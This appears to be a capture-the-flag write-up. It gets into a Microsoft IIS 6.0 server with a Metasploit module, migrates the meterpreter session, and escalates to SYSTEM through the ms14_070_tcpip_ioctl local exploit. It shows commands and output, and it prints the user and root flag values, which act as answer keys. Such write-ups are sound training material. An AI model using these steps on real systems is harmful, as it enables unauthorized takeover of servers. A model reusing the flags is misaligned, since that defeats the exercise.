For this version of `Microsoft IIS httpd 6.0` we've found an exploit:

![](../../../assets/7df83f956ca3caa131881cd46b663fbb.png)

## Metasploit

There's a `metasploit` module for it:

![](../../../assets/91b9a6f7b8dde3529513f37d1f9921e1.png)

Configure the options and just run the exploit.

After getting the shell we can `systeminfo` the target:

```powershell
c:\windows\system32\inetsrv>systeminfo

We can now use `metasploit` to look up vulnerabilities for this version, it's called `local_exploit_suggester`.

Configure it to your current session, and then run the exploit afterwards.

![](../../../assets/e1023f7de49977daa0aa73a56ae9250d.png)

From these it appears that `exploit/windows/local/ms14_070_tcpip_ioctl` is most interesting to us.
Let's use it and set up the options. First we'll have to migrate to a process running under `NT AUTHORITY\NETWORK SERVICE` which we can find using `ps` in `meterpreter`.

![](../../../assets/72564c4ea1d5b1d3b8fd1980fa8b2c8e.png)

We'll migrate to `3796`.

```bash
meterpreter > migrate 3796
[*] Migrating from 3848 to 3796...
[*] Migration completed successfully.
meterpreter > 
```

Now we can use the `ms14_070_tcpip_ioctl` exploit.

![](../../../assets/a5536e100dd5bda3634653e5dbc9de8c.png)

```bash
msf6 exploit(windows/local/ms14_070_tcpip_ioctl) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > 
```

Great, now we can get those flags.

## Flags

==user.txt==
go into `Documents and settings` and from here we can get both flags:
![](../../../assets/51488557edce1ea888330a345dba4a6a.png)

Since I had trouble accessing the files via the `shell` I instead opted for the `meterpreter session`:

```bash
# Failed attempts
C:\>cd "Documents and Settings"
cd "Documents and Settings"

C:\Documents and Settings>cd Administrator
cd Administrator
Access is denied.
```

```bash
meterpreter > cat "C:\Documents and Settings\Harry\Desktop\user.txt"
bdff5ec67c3cff017f2bedc146a5d869
```

==root.txt==
Same for the `root flag`:

```bash
meterpreter > cat "C:\Documents and Settings\Administrator\Desktop\root.txt"
9359e905a2c35f861f6a57cecf28bb7b
```
